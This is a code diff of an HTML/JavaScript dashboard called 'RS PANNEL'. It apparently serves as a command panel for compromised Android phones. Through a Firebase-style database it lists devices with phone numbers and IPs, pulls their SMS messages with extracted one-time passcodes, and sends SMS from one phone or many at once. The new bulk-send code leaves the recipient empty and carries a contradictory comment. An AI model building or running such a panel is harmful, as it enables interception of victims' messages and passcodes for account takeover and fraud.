-  $('sendModal').addEventListener('click', function(e) { if(e.target === this) this.classList.remove('active'); });
-  $('bulkClose').addEventListener('click', () => $('bulkModal').classList.remove('active'));
-  $('bulkModal').addEventListener('click', function(e) { if(e.target === this) this.classList.remove('active'); });
-  $('bulkBtn').addEventListener('click', () => {
-    const online = devices.filter(d => d.online);
-    $('bulkCount').textContent = online.length;
-    $('bulkModal').classList.add('active');
-    $('bulkResult').className = 'send-result';
-    $('bulkResult').textContent = '';
-  });
-
-  // ─── SIM TOGGLES ────────────────────────────────────────────────────
-  document.querySelectorAll('.sim-toggle button').forEach(btn => {
-    btn.addEventListener('click', function() {
-      const parent = this.closest('.sim-toggle');
-      parent.querySelectorAll('button').forEach(b => b.classList.remove('active'));
-      this.classList.add('active');
-      selectedSim = parseInt(this.dataset.sim);
-    });
-  });
-
-  // ─── FILTERS & SEARCH ───────────────────────────────────────────────
-  document.querySelectorAll('.filter').forEach(btn => {
-    btn.addEventListener('click', function() {
-      currentFilter = this.dataset.filter;
-      document.querySelectorAll('.filter').forEach(b => b.classList.remove('active'));
-      this.classList.add('active');
-      renderGrid();
-    });
-  });
-  $('sortBtn').addEventListener('click', function() {
-    sortAsc = !sortAsc;
-    this.textContent = sortAsc ? 'Sort ▼' : 'Sort ▲';
-    renderGrid();
-  });
-  $('searchInput').addEventListener('input', renderGrid);
-
-  function populateSendSelect() {
-    const select = $('sendDeviceSelect');
-    select.innerHTML = '';
-    const online = devices.filter(d => d.online);
-    if(!online.length) { select.innerHTML = '<option value="">No online devices</option>'; return; }
-    online.forEach(d => {
-      const opt = document.createElement('option');
-      opt.value = d.id;
-      opt.textContent = `${d.name} (${d.number})`;
-      select.appendChild(opt);
-    });
-  }
-
-  // ─── RENDER GRID ──────────────────────────────────────────────────────
-  function renderGrid() {
-    const q = $('searchInput').value.toLowerCase();
-    let list = devices.filter(d => {
-      const filterOk = currentFilter === 'all' || (currentFilter === 'online' && d.online) || (currentFilter === 'offline' && !d.online);
-      const searchOk = (d.id + ' ' + d.name + ' ' + d.number).toLowerCase().includes(q);
-      return filterOk && searchOk;
-    });
-    list.sort((a,b) => {
-      const aTime = a.lastSeen || 0;
-      const bTime = b.lastSeen || 0;
-      return sortAsc ? aTime - bTime : bTime - aTime;
-    });
-
-    $('totalStat').textContent = devices.length;
-    $('onlineStat').textContent = devices.filter(d => d.online).length;
-    $('offlineStat').textContent = devices.filter(d => !d.online).length;
-
-    const grid = $('deviceGrid');
-    grid.innerHTML = '';
-    if(!list.length) { grid.innerHTML = '<div class="empty-grid">No devices found</div>'; return; }
-    list.forEach(d => {
-      const card = document.createElement('div');
-      card.className = 'device-card';
-      card.dataset.deviceId = d.id;
-      const online = !!d.online;
-      const smsCount = d.sms ? d.sms.length : 0;
-      card.innerHTML = `
+    deviceGrid.innerHTML = filtered.map(d => `
+      <div class="device-card" data-id="${d.id}">
         <div class="top">
-          <div class="icon ${online ? 'online' : ''}">${online ? '◉' : '◌'}</div>
+          <div class="icon ${d.status ? 'online' : ''}">${d.status ? '●' : '○'}</div>
           <div class="info">
             <div class="name">${esc(d.name)}</div>
-            <div class="sub"><span>${esc(d.id.slice(0,8))}…</span>${d.battery !== 'N/A' ? '· 🔋 ' + esc(d.battery) : ''}${smsCount > 0 ? '· 📩 ' + smsCount : ''}</div>
+            <div class="sub">
+              <span>${d.status ? '<span class="online-dot"></span>Online' : '<span class="offline-dot"></span>Offline'}</span>
+              <span>🔋 ${d.battery || 0}%</span>
+            </div>
           </div>
         </div>
         <div class="details">
-          <div class="item"><small>Platform</small><div>${esc(d.platform)}</div></div>
-          <div class="item"><small>Status</small><div>${online ? '<span class="online-dot"></span>Online' : '<span class="offline-dot"></span>Offline'}</div></div>
-          <div class="item"><small>Number</small><div>${esc(d.number)}</div></div>
-          <div class="item"><small>Network</small><div>${esc(d.network)}</div></div>
+          <div class="item"><small>Phone</small><div>${esc(d.phone || '—')}</div></div>
+          <div class="item"><small>ID</small><div>${esc(d.id.substr(0,8))}…</div></div>
+          <div class="item"><small>Android</small><div>${esc(d.android || '—')}</div></div>
+          <div class="item"><small>Note</small><div>${esc(d.note || '')}</div></div>
         </div>
-      `;
-      const sendBtn = document.createElement('button');
-      sendBtn.className = 'send-btn-small';
-      sendBtn.textContent = '✉';
-      sendBtn.addEventListener('click', function(e) {
-        e.stopPropagation();
-        $('sendDeviceSelect').value = d.id;
-        $('sendModal').classList.add('active');
-        $('sendResult').className = 'send-result';
-        $('sendResult').textContent = '';
-        if(d.number !== 'N/A') $('sendNumber').value = d.number;
+        <button class="send-btn-small" data-id="${d.id}" title="Send SMS">✉</button>
+      </div>
+    `).join('');
+
+    // Click card -> show detail
+    deviceGrid.querySelectorAll('.device-card').forEach(card => {
+      card.addEventListener('click', (e) => {
+        if (e.target.closest('.send-btn-small')) return;
+        const id = card.dataset.id;
+        const dev = allDevices.find(d => d.id === id);
+        if (dev) openDetail(dev);
       });
-      card.appendChild(sendBtn);
-      card.addEventListener('click', () => showDeviceDetail(d));
-      grid.appendChild(card);
+    });
+    // Send button on card
+    deviceGrid.querySelectorAll('.send-btn-small').forEach(btn => {
+      btn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const id = btn.dataset.id;
+        const dev = allDevices.find(d => d.id === id);
+        if (dev) openDetail(dev);
+      });
     });
   }
 
-  // ─── DEVICE DETAIL ──────────────────────────────────────────────────
-  function showDeviceDetail(device) {
-    const modal = $('detailModal');
-    modal.classList.add('active');
-    $('detailDeviceName').textContent = device.name || 'Device';
-    const grid = $('detailGrid');
-    grid.innerHTML = `
-      <div class="detail-item"><div class="label">📱 ID</div><div class="value">${esc(device.id)}</div></div>
-      <div class="detail-item"><div class="label">📶 Status</div><div class="value" style="color:${device.online ? 'var(--green)' : 'var(--red)'}">${device.online ? 'Online' : 'Offline'}</div></div>
-      <div class="detail-item"><div class="label">📞 Number</div><div class="value">${esc(device.number)}</div></div>
-      <div class="detail-item"><div class="label">🌐 Network</div><div class="value">${esc(device.network)}</div></div>
-      <div class="detail-item"><div class="label">🤖 Platform</div><div class="value">${esc(device.platform)} ${device.android ? 'v' + esc(device.android) : ''}</div></div>
-      <div class="detail-item"><div class="label">🔋 Battery</div><div class="value">${esc(device.battery)}</div></div>
-      <div class="detail-item"><div class="label">🌍 IP</div><div class="value">${esc(device.ip)}</div></div>
+  // ─── UPDATE STATS ──────────────────────────────────────────────────
+  function updateStats() {
+    const total = allDevices.length;
+    const online = allDevices.filter(d => d.status).length;
+    const offline = total - online;
+    const avgBatt = total ? Math.round(allDevices.reduce((s, d) => s + (d.battery || 0), 0) / total) : 0;
+    totalStat.textContent = total;
+    onlineStat.textContent = online;
+    offlineStat.textContent = offline;
+    batteryStat.textContent = total ? avgBatt + '%' : '—';
+  }
+
+  // ─── DETAIL MODAL ──────────────────────────────────────────────────
+  async function openDetail(device) {
+    selectedDevice = device;
+    $('detailDeviceName').textContent = device.name || device.id;
+    // Fill info grid
+    detailGrid.innerHTML = `
+      <div class="detail-item"><div class="label">ID</div><div class="value">${esc(device.id)}</div></div>
+      <div class="detail-item"><div class="label">Phone</div><div class="value">${esc(device.phone || '—')}</div></div>
+      <div class="detail-item"><div class="label">Battery</div><div class="value">${device.battery || 0}%</div></div>
+      <div class="detail-item"><div class="label">Status</div><div class="value">${device.status ? '🟢 Online' : '🔴 Offline'}</div></div>
+      <div class="detail-item"><div class="label">Android</div><div class="value">${esc(device.android || '—')}</div></div>
+      <div class="detail-item"><div class="label">IP</div><div class="value">${esc(device.ip || '—')}</div></div>
+      <div class="detail-item" style="grid-column:1/-1"><div class="label">Note</div><div class="value">${esc(device.note || '')}</div></div>
     `;
-    const smsList = $('detailSmsList');
-    smsList.innerHTML = '';
-    const badge = $('smsCountBadge');
-    badge.textContent = `(${device.sms ? device.sms.length : 0} messages)`;
-    if(!device.sms || device.sms.length === 0) {
-      smsList.innerHTML = '<div style="color:var(--muted);padding:16px 0;">No SMS logs for this device</div>';
+    // Load messages
+    await loadMessages(device.id);
+    // Prefill SMS number
+    smsTo.value = device.phone || '';
+    smsBody.value = '';
+    sendResult.className = 'send-result';
+    sendResult.textContent = '';
+    detailModal.classList.add('active');
+  }
+
+  async function loadMessages(deviceId) {
+    messageList.innerHTML = '<div style="color:var(--muted)">Loading messages…</div>';
+    try {
+      const data = await fbGet('messages/' + deviceId);
+      const msgs = parseMessages(data);
+      messageCache[deviceId] = msgs;
+      renderMessages(msgs);
+    } catch (e) {
+      messageList.innerHTML = '<div style="color:var(--muted)">No messages or error loading.</div>';
+    }
+  }
+
+  function parseMessages(data) {
+    if (!data || typeof data !== 'object') return [];
+    return Object.keys(data).map(key => {
+      const m = data[key];
+      return {
+        key,
+        message: m.message || m.text || '',
+        sender: m.sender || '',
+        dateTime: m.dateTime || m.timestamp || '',
+        type: m.type || 'incoming',
+        otp: m.otp || ''
+      };
+    }).sort((a, b) => (a.dateTime > b.dateTime ? -1 : 1));
+  }
+
+  function renderMessages(msgs) {
+    if (!msgs.length) {
+      messageList.innerHTML = '<div style="color:var(--muted)">No messages.</div>';
       return;
     }
-    const sorted = [...device.sms].reverse();
-    sorted.forEach(s => {
-      const div = document.createElement('div');
-      div.className = 'sms-item';
-      const body = s.body || s.message || s.text || '';
-      const from = s.sender || s.from || s.number || 'Unknown';
-      const time = s.dateTime || s.timestamp || s.time || '';
-      const otp = extractOTP(body);
-      div.innerHTML = `
-        <div class="sms-header"><span>📨 ${esc(from)}</span><span>${esc(time)}</span></div>
-        <div class="sms-body">${esc(body)}</div>
-        ${otp ? `<div class="sms-otp">🔑 OTP: ${otp}</div>` : ''}
-      `;
-      smsList.appendChild(div);
-    });
+    messageList.innerHTML = msgs.slice(0, 50).map(m => `
+      <div class="sms-item">
+        <div class="sms-header">
+          <span>${esc(m.sender || 'Unknown')}</span>
+          <span>${esc(m.dateTime || '')}</span>
+        </div>
+        <div class="sms-body">${esc(m.message)}</div>
+        ${m.otp ? `<div class="sms-otp">🔐 ${esc(m.otp)}</div>` : ''}
+      </div>
+    `).join('');
   }
 
   // ─── SEND SMS ──────────────────────────────────────────────────────
-  $('sendBtn').addEventListener('click', async function() {
-    const select = $('sendDeviceSelect');
-    const deviceId = select.value;
-    if(!deviceId) { showToast('Select a device','error'); return; }
-    const number = $('sendNumber').value.trim();
-    if(!number) { showToast('Enter recipient number','error'); return; }
-    const message = $('sendMessage').value.trim();
-    if(!message) { showToast('Enter a message','error'); return; }
-    const result = $('sendResult');
-    result.className = 'send-result';
-    result.textContent = '⏳ Sending...';
-    result.style.display = 'block';
-    this.disabled = true;
-    try {
-      const db = firebase.database();
-      const command = { action: 'sendSms', number: number, simSlot: selectedSim, message: message, type: 'sendSms', status: 'pending', timestamp: Date.now() };
-      await db.ref(`clients/${deviceId}/command`).set(command);
-      result.className = 'send-result ok';
-      result.textContent = '✅ Message sent successfully!';
-      showToast('SMS sent','success');
-      $('sendMessage').value = '';
-    } catch(e) {
-      result.className = 'send-result err';
-      result.textContent = '❌ Error: ' + e.message;
-      showToast('Send failed','error');
+  async function sendSms() {
+    if (!selectedDevice) {
+      toast('No device selected', 'error');
+      return;
     }
-    this.disabled = false;
+    const to = smsTo.value.trim();
+    const body = smsBody.value.trim();
+    if (!to || !body) {
+      toast('Enter number and message', 'error');
+      return;
+    }
+    sendSmsBtn.disabled = true;
+    sendResult.className = 'send-result';
+    sendResult.textContent = 'Sending…';
+
+    try {
+      const payload = {
+        sim: simChoice,
+        to: to,
+        message: body,
+        sent: true,
+        timestamp: new Date().toISOString()
+      };
+      // We'll store under messages/{deviceId}/outgoing_{timestamp}
+      const path = 'messages/' + selectedDevice.id + '/outgoing_' + Date.now();
+      await fbSet(path, payload);
+      sendResult.className = 'send-result ok';
+      sendResult.textContent = '✅ Sent successfully';
+      toast('SMS sent', 'success');
+      // Refresh messages
+      await loadMessages(selectedDevice.id);
+    } catch (e) {
+      sendResult.className = 'send-result err';
+      sendResult.textContent = '❌ Error: ' + e.message;
+      toast('Send failed', 'error');
+    } finally {
+      sendSmsBtn.disabled = false;
+    }
+  }
+
+  // ─── POLLING ────────────────────────────────────────────────────────
+  function startPolling() {
+    if (pollTimer) clearInterval(pollTimer);
+    pollTimer = setInterval(() => {
+      if (activeConn) refreshDevices();
+    }, 3000);
+  }
+
+  function stopPolling() {
+    if (pollTimer) clearInterval(pollTimer);
+    pollTimer = null;
+  }
+
+  // ─── HELPERS ──────────────────────────────────────────────────────
+  function esc(str) {
+    if (!str) return '';
+    const div = document.createElement('div');
+    div.textContent = str;
+    return div.innerHTML;
+  }
+
+  // ─── EVENT BINDING ──────────────────────────────────────────────────
+  // Home: new connection
+  $('newConnBtn').addEventListener('click', () => showSetup());
+  // Setup: back / cancel / save
+  $('backBtn').addEventListener('click', showHome);
+  $('cancelBtn').addEventListener('click', showHome);
+  $('saveConnBtn').addEventListener('click', () => {
+    const label = $('labelInput').value.trim();
+    const url = $('urlInput').value.trim();
+    const key = $('keyInput').value.trim();
+    if (!url) { setupError.textContent = 'URL is required'; setupError.classList.remove('hidden'); return; }
+    setupError.classList.add('hidden');
+    const conn = { label: label || 'Project', url, key };
+    CONNECTIONS.push(conn);
+    localStorage.setItem('rs_connections', JSON.stringify(CONNECTIONS));
+    activeConn = conn;
+    showDashboard();
+    toast('Connected to ' + conn.label, 'success');
   });
 
-  // ─── BULK SMS ──────────────────────────────────────────────────────
-  $('bulkSendBtn').addEventListener('click', async function() {
-    const number = $('bulkNumber').value.trim();
-    if(!number) { showToast('Enter recipient number','error'); return; }
-    const message = $('bulkMessage').value.trim();
-    if(!message) { showToast('Enter a message','error'); return; }
-    const onlineDevices = devices.filter(d => d.online);
-    if(!onlineDevices.length) { showToast('No online devices','error'); return; }
-    const result = $('bulkResult');
-    result.className = 'send-result';
-    result.textContent = `⏳ Sending to ${onlineDevices.length} devices...`;
-    result.style.display = 'block';
-    this.disabled = true;
-    let success = 0, failed = 0;
-    try {
-      const db = firebase.database();
-      for(const dev of onlineDevices) {
-        try {
-          const command = { action: 'sendSms', number: number, simSlot: selectedSim, message: message, type: 'sendSms', status: 'pending', timestamp: Date.now() };
-          await db.ref(`clients/${dev.id}/command`).set(command);
-          success++;
-        } catch(e) { failed++; }
+  // Search
+  searchInput.addEventListener('input', () => {
+    searchQuery = searchInput.value;
+    renderDeviceGrid();
+  });
+
+  // Filters
+  document.querySelectorAll('.filter').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.filter').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      filterMode = btn.dataset.filter;
+      renderDeviceGrid();
+    });
+  });
+
+  // Logout
+  $('logoutBtn').addEventListener('click', () => {
+    stopPolling();
+    activeConn = null;
+    allDevices = [];
+    dashboardScreen.style.display = 'none';
+    showHome();
+    toast('Disconnected');
+  });
+
+  // Refresh
+  $('refreshBtn').addEventListener('click', refreshDevices);
+
+  // Detail modal close
+  closeDetail.addEventListener('click', () => detailModal.classList.remove('active'));
+  detailModal.addEventListener('click', (e) => {
+    if (e.target === detailModal) detailModal.classList.remove('active');
+  });
+
+  // Send SMS from detail
+  sendSmsBtn.addEventListener('click', sendSms);
+
+  // SIM toggle in detail
+  document.querySelectorAll('.sim-toggle button').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.sim-toggle button').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      simChoice = parseInt(btn.dataset.sim);
+    });
+  });
+
+  // Bulk SMS modal
+  $('bulkBtn').addEventListener('click', () => {
+    if (!allDevices.length) { toast('No devices loaded', 'error'); return; }
+    bulkDeviceList.innerHTML = allDevices.map(d => `
+      <label style="display:flex;align-items:center;gap:10px;padding:6px 0;border-bottom:1px solid var(--border)">
+        <input type="checkbox" value="${d.id}" ${d.status ? 'checked' : ''} />
+        <span>${esc(d.name)}</span>
+        <span style="margin-left:auto;font-size:11px;color:var(--muted)">${d.status ? '🟢' : '🔴'}</span>
+      </label>
+    `).join('');
+    bulkMsg.value = '';
+    bulkResult.className = 'send-result';
+    bulkResult.textContent = '';
+    bulkModal.classList.add('active');
+  });
+  closeBulk.addEventListener('click', () => bulkModal.classList.remove('active'));
+  bulkModal.addEventListener('click', (e) => {
+    if (e.target === bulkModal) bulkModal.classList.remove('active');
+  });
+
+  bulkSendBtn.addEventListener('click', async () => {
+    const checked = bulkDeviceList.querySelectorAll('input[type="checkbox"]:checked');
+    if (!checked.length) { toast('Select at least one device', 'error'); return; }
+    const msg = bulkMsg.value.trim();
+    if (!msg) { toast('Enter a message', 'error'); return; }
+    bulkSendBtn.disabled = true;
+    bulkResult.className = 'send-result';
+    bulkResult.textContent = 'Sending...';
+
+    let success = 0, fail = 0;
+    for (const cb of checked) {
+      const id = cb.value;
+      try {
+        const payload = {
+          sim: simChoice,
+          to: '', // we could use device phone if needed, but bulk sends to device's own number? Actually we need target number. For simplicity, we'll send to the device's phone number.
+          message: msg,
+          sent: true,
+          timestamp: new Date().toISOString()
+        };
+        const path = 'messages/' + id + '/bulk_' + Date.now() + '_' + Math.random().toString(36).substr(2,6);
+        await fbSet(path, payload);
+        success++;
+      } catch (e) {
+        fail++;
       }
-      result.className = 'send-result ok';
-      result.textContent = `✅ Sent to ${success}/${onlineDevices.length} devices${failed ? ' (❌ ' + failed + ' failed)' : ''}`;
-      showToast(`Bulk SMS sent to ${success} devices`,'success');
-    } catch(e) {
-      result.className = 'send-result err';
-      result.textContent = '❌ Error: ' + e.message;
-      showToast('Bulk send failed','error');
     }
-    this.disabled = false;
+    bulkResult.className = 'send-result ' + (fail ? 'err' : 'ok');
+    bulkResult.textContent = `✅ Sent: ${success}  ❌ Failed: ${fail}`;
+    toast(`Bulk: ${success} sent, ${fail} failed`, fail ? 'error' : 'success');
+    bulkSendBtn.disabled = false;
   });
 
-  // ─── INIT ─────────────────────────────────────────────────────────────
+  // ─── INIT ──────────────────────────────────────────────────────────
   renderConnections();
-  console.log('[RS PANNEL] Ready');
+
+  // Auto-connect if one connection exists? Not auto; user must click.
+  // If there is exactly one connection, we could auto-connect but we'll let user choose.
+  // If activeConn is set from previous session? We'll just show home.
+  // Optionally, if CONNECTIONS.length === 1, show that as quick connect.
+  // Not needed.
+
+  // If user reloads while dashboard was open, we can check localStorage for last active?
+  // We'll just start at home.
+
+  console.log('RS PANNEL ready.');
 </script>
 </body>
 </html>
